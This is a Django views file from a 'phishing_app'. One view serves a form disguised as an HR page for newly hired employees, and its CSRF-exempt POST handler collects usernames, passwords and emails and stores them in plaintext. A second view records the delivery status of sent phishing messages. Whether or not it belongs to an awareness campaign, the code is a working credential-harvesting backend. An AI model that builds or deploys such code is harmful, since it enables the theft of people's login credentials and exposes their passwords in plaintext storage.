from django.http import JsonResponse
from django.shortcuts import render
from django.views import View
from datetime import datetime, timedelta

from django.views.decorators.csrf import csrf_exempt

from apps.phishing_app import models


class Preencher_Perfil(View):
    def get(self, request):
        return render(request, 'gente_gestao_comunicado_admitidos_app/form_colaborador_admitido.html')

    @csrf_exempt
    def post(self, request):
        usuario = request.POST['usuario']
        senha = request.POST['senha']
        email = request.POST['email']
        data = datetime.now()

        objeto = models.Phishing(
            usuario=usuario,
            senha=senha,
            data_envio=data,
            email=email
        )

        objeto.save()

        return JsonResponse('Ok', safe=False)

class Phishing_Enviados(View):

    @csrf_exempt
    def get(self, request):
        usuario = request.GET['email'].split('@')[0]
        status = request.GET['status']
        data_envio = datetime.now()

        objeto = models.Phishing_Enviados(
                    usuario=usuario,
                    data_envio=data_envio,
                    status=status
                )
        objeto.save()

        return JsonResponse('Ok', safe=False)